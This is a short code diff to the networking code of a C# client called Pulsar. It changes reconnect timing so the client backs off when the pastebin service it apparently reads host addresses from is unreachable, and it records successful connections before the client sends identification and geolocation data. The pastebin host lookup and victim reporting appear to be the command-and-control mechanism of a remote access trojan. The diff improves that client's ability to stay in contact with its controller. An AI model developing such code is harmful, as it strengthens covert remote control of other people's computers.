@@ -76,7 +76,24 @@ namespace Pulsar.Client.Networking
                     if (host?.IpAddress == null)
                     {
                         Debug.WriteLine("Failed to get a valid host to connect to. Will retry after delay.");
-                        Thread.Sleep(Settings.RECONNECTDELAY + _random.Next(250, 750));
+                        
+                        // Check pastebin status to determine appropriate wait time
+                        var (isReachable, suggestedWaitMs) = _hosts.GetPastebinStatus();
+                        int waitTime;
+                        
+                        if (!isReachable && suggestedWaitMs > 0)
+                        {
+                            // Use suggested wait time for pastebin failures (5+ minutes to avoid rate limiting)
+                            waitTime = suggestedWaitMs;
+                            Debug.WriteLine($"Pastebin unreachable, waiting {waitTime / 1000} seconds before retry");
+                        }
+                        else
+                        {
+                            // Use normal reconnect delay when pastebin is reachable but no hosts available
+                            waitTime = Settings.RECONNECTDELAY;
+                        }
+                        
+                        Thread.Sleep(waitTime + _random.Next(250, 750));
                         continue;
                     }
 
@@ -144,6 +161,9 @@ namespace Pulsar.Client.Networking
 
             if (connected)
             {
+                // Notify hosts manager of successful connection for pastebin timing logic
+                _hosts.NotifySuccessfulConnection();
+                
                 // send client identification once connected
 
                 var geoInfo = GeoInformationFactory.GetGeoInformation();
